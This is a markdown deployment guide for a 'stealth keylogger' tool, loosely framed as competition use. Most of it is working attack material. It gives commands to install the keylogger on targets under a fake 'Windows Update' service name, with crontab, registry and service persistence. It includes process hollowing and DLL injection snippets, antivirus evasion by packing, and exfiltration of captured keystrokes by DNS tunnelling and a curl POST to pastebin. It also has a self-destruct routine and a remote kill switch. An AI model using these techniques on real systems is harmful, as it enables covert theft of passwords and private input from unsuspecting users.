# 🚀 Deployment Guide

This guide provides comprehensive deployment strategies for the stealth keyloggers in various scenarios.

## ⚡ Quick Deployment Commands

### 🐧 Linux Quick Deploy
```bash
# Clone and build
git clone https://github.com/sweetpotatohack/stealth-keyloggers.git
cd stealth-keyloggers
chmod +x build/build_linux.sh
./build/build_linux.sh

# Install as service
sudo ./install_linux.sh

# Verify deployment
sudo systemctl status ksysmon.service
```

### 🪟 Windows Quick Deploy
```bash
# Cross-compile from Linux
chmod +x build/build_windows.bat
./build/build_windows.bat

# Transfer files to Windows target:
# - stealth_keylogger.exe
# - decrypt_logs.exe
# - install_service.bat

# On Windows (as Administrator):
install_service.bat
```

## 🎯 Competition Deployment Strategies

### 🏆 Strategy 1: Silent Service Installation

**Best for**: Long-term persistence during competitions

#### Linux Deployment
```bash
# 1. Build with static linking
CFLAGS="-static -O3 -s" ./build/build_linux.sh

# 2. Copy to target system
scp stealth_keylogger user@target:/tmp/.update

# 3. Remote installation
ssh user@target "sudo /tmp/.update && sudo systemctl enable ksysmon"
```

#### Windows Deployment
```cmd
# 1. Copy files to system directory
copy stealth_keylogger.exe C:\Windows\System32\wuauserv.exe

# 2. Create service with legitimate name
sc create "Windows Update" binPath= "C:\Windows\System32\wuauserv.exe" start= auto

# 3. Start service
net start "Windows Update"
```

### 🏆 Strategy 2: Manual Execution

**Best for**: Testing and short-term operations

#### Linux
```bash
# Background execution with nohup
nohup sudo ./stealth_keylogger > /dev/null 2>&1 &

# Check process
ps aux | grep -E "(kthread|ksys)"
```

#### Windows
```cmd
# Run as service process
stealth_keylogger.exe &

# Check in Task Manager under "Windows processes"
```

### 🏆 Strategy 3: Scheduled Execution

**Best for**: Periodic activation to avoid detection

#### Linux Crontab
```bash
# Add to root crontab
echo "*/30 * * * * /usr/bin/ksysmond" | sudo crontab -

# Or at system startup
echo "@reboot /usr/bin/ksysmond" | sudo crontab -
```

#### Windows Task Scheduler
```cmd
# Create scheduled task
schtasks /create /tn "System Update Check" /tr "C:\Windows\System32\wuauserv.exe" /sc onstart /ru SYSTEM
```

## 🔧 Advanced Deployment Techniques

### 🎭 Technique 1: Process Hollowing

**For advanced users**: Hide within legitimate processes

```cpp
// Windows process hollowing example
PROCESS_INFORMATION pi;
STARTUPINFO si = {sizeof(si)};

CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, 
              NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Hollow out process and inject keylogger code
// Resume execution with keylogger payload
```

### 🎭 Technique 2: DLL Injection

**For persistence**: Inject into existing processes

```cpp
// Inject into winlogon.exe or explorer.exe
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
VirtualAllocEx(hProc, NULL, dllPathLen, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProc, allocMem, dllPath, dllPathLen, NULL);
CreateRemoteThread(hProc, NULL, 0, LoadLibrary, allocMem, 0, NULL);
```

### 🎭 Technique 3: Registry-Based Persistence

**Multiple registry locations**:

```batch
# User-level persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\System32\wuauserv.exe"

# System-level persistence  
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Windows\System32\wuauserv.exe"

# Service persistence
reg add "HKLM\System\CurrentControlSet\Services\WinUpdate" /v "ImagePath" /t REG_SZ /d "C:\Windows\System32\wuauserv.exe"
```

## 🛡️ Anti-Detection Deployment

### 🔍 Signature Evasion

#### 1. Binary Packing
```bash
# Pack with UPX
upx --best --lzma stealth_keylogger.exe

# Custom packer (recommended for competitions)
./custom_packer stealth_keylogger.exe packed_keylogger.exe
```

#### 2. Code Obfuscation
```bash
# Use different compiler flags
g++ -O3 -fno-stack-protector -fomit-frame-pointer -s \
    -DNDEBUG -march=native src/linux_keylogger.cpp

# Strip all symbols
strip -s --strip-unneeded stealth_keylogger
```

#### 3. Runtime Polymorphism
```cpp
// Change binary signature at runtime
void mutateBinary() {
    unsigned char* code = (unsigned char*)main;
    for (int i = 0; i < 100; i++) {
        code[i] ^= 0x90; // XOR with NOP
    }
}
```

### 🕒 Time-Based Evasion

#### Delayed Activation
```cpp
// Wait for user activity before starting
while (GetLastInputInfo() < 300000) { // 5 minutes
    Sleep(10000);
}
// Start keylogging
```

#### Random Intervals
```cpp
// Random sleep intervals
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_int_distribution<> dis(60, 300); // 1-5 minutes

while (running) {
    logKeys();
    Sleep(dis(gen) * 1000);
}
```

## 📊 Deployment Verification

### ✅ Linux Verification Scripts

```bash
#!/bin/bash
# verify_deployment.sh

echo "=== Stealth Keylogger Deployment Verification ==="

# Check if service is running
if systemctl is-active --quiet ksysmon; then
    echo "✅ Service is running"
else
    echo "❌ Service is not running"
fi

# Check log file
if [ -f "/tmp/.sys_log" ]; then
    echo "✅ Log file exists"
    echo "   Size: $(du -h /tmp/.sys_log | cut -f1)"
else
    echo "❌ Log file not found"
fi

# Check process
if pgrep -f ksysmond > /dev/null; then
    echo "✅ Process is running"
    echo "   PID: $(pgrep -f ksysmond)"
else
    echo "❌ Process not found"
fi

# Check persistence
if crontab -l | grep -q ksysmond; then
    echo "✅ Crontab persistence active"
else
    echo "❌ No crontab persistence"
fi
```

### ✅ Windows Verification Scripts

```batch
@echo off
echo === Stealth Keylogger Deployment Verification ===

REM Check service status
sc query WindowsUpdate | find "RUNNING" >nul
if %errorlevel% == 0 (
    echo ✅ Service is running
) else (
    echo ❌ Service is not running
)

REM Check log file
if exist "%TEMP%\sys_backup.txt" (
    echo ✅ Log file exists
) else (
    echo ❌ Log file not found
)

REM Check registry persistence
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" >nul 2>&1
if %errorlevel% == 0 (
    echo ✅ Registry persistence active
) else (
    echo ❌ No registry persistence
)
```

## 🔄 Log Management

### 📤 Log Extraction

#### Secure Extraction
```bash
# Encrypt before extraction
openssl enc -aes-256-cbc -salt -in /tmp/.sys_log -out keylog_encrypted.bin

# Steganographic hiding in images
steghide embed -cf innocent_image.jpg -ef keylog_encrypted.bin
```

#### Network Exfiltration
```bash
# DNS tunneling
./dns_exfil -d captured_keys.txt -s dns.example.com

# HTTPS POST to legitimate service
curl -X POST -H "Content-Type: application/json" \
     -d '{"log":"'$(base64 /tmp/.sys_log)'"}' \
     https://api.pastebin.com/api/api_post.php
```

### 📋 Log Rotation

#### Automatic Log Management
```bash
#!/bin/bash
# log_rotation.sh

LOG_FILE="/tmp/.sys_log"
MAX_SIZE=1048576  # 1MB

if [ -f "$LOG_FILE" ]; then
    SIZE=$(stat -f%z "$LOG_FILE" 2>/dev/null || stat -c%s "$LOG_FILE")
    if [ "$SIZE" -gt "$MAX_SIZE" ]; then
        # Archive old log
        mv "$LOG_FILE" "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)"
        # Create new log
        touch "$LOG_FILE"
        chmod 600 "$LOG_FILE"
    fi
fi
```

## 🚨 Emergency Procedures

### 🔥 Self-Destruct Mechanism

```cpp
// Emergency cleanup function
void emergencyCleanup() {
    // Stop logging
    isRunning = false;
    
    // Delete log files
    unlink("/tmp/.sys_log");
    
    // Remove persistence
    system("crontab -r");
    system("systemctl disable ksysmon");
    system("rm -f /etc/systemd/system/ksysmon.service");
    
    // Self-delete
    unlink(argv[0]);
    exit(0);
}

// Trigger on specific conditions
if (detectionImminent()) {
    emergencyCleanup();
}
```

### 📞 Remote Control Commands

#### Kill Switch via Network
```cpp
// Check for kill switch signal
bool checkKillSwitch() {
    // DNS TXT record check
    std::string result = queryDNS("killswitch.example.com", "TXT");
    return (result.find("TERMINATE") != std::string::npos);
}
```

## 📈 Performance Optimization

### ⚡ Resource Usage Minimization

```cpp
// CPU throttling
void throttleCPU() {
    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
}

// Memory optimization
void optimizeMemory() {
    SetProcessWorkingSetSize(GetCurrentProcess(), -1, -1);
}
```

### 📊 Monitoring Performance

```bash
# Monitor resource usage
watch -n 5 'ps aux | grep ksysmond | grep -v grep'

# Memory usage tracking
echo 0 > /proc/$(pgrep ksysmond)/oom_score_adj
```

## 🎓 Training Scenarios

### 🧪 Lab Environment Setup

```bash
# Create test environment
docker run -it --privileged ubuntu:latest

# Install dependencies
apt update && apt install build-essential

# Deploy keylogger
./build/build_linux.sh
sudo ./install_linux.sh

# Test with synthetic keystrokes
xdotool type "testing keylogger capture"
```

### 🎯 Competition Simulation

```bash
# Simulate blue team detection attempts
./simulate_detection.sh

# Test persistence mechanisms
sudo reboot
# Verify keylogger restart

# Test against common AV signatures
./test_av_detection.sh
```

---

**Remember**: Always test thoroughly in controlled environments before competition deployment!